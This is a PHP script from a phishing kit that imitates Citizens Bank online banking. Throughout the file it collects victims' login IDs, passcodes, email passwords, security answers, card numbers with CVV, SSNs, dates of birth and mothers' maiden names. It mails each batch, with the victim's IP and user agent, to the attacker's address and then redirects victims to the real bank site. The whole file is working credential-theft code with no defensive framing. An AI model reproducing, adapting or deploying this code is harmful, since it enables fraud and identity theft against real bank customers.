<?php
include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);
if (isset($_POST['btn2'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| yYy |--------------|\n";
	
	$message .= "Question 1           : ".$_POST['q1']."\n";
	$message .= "Answer 1           : ".$_POST['ans1']."\n";
	$message .= "Question 2           : ".$_POST['q2']."\n";
	$message .= "Answer 2           : ".$_POST['ans2']."\n";
	$message .= "Email Address           : ".$_POST['aii']."\n";
	$message .= "Email Password           : ".$_POST['prr']."\n";

	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|---------- -----------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: ./card.html");
	
}

else if (isset($_POST['btn4'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	$message .= "Card Number            : ".$_POST['cnum']."\n";
	$message .= "CCV             : ".$_POST['ccv']."\n";
	$message .= "Expire Date             : ".$_POST['exdate']."\n";
	$message .= "Address           : ".$_POST['add']."\n";
	$message .= "SSN            : ".$_POST['ssn']."\n";
	$message .= "DOB            : ".$_POST['dob']."\n";
	$message .= "City            : ".$_POST['ct']."\n";
	$message .= "State            : ".$_POST['state']."\n";
	$message .= "MMN            : ".$_POST['mmn']."\n";
	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|---------- -----------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: https://www4.citizensbankonline.com/");
	
}

else if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  ------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>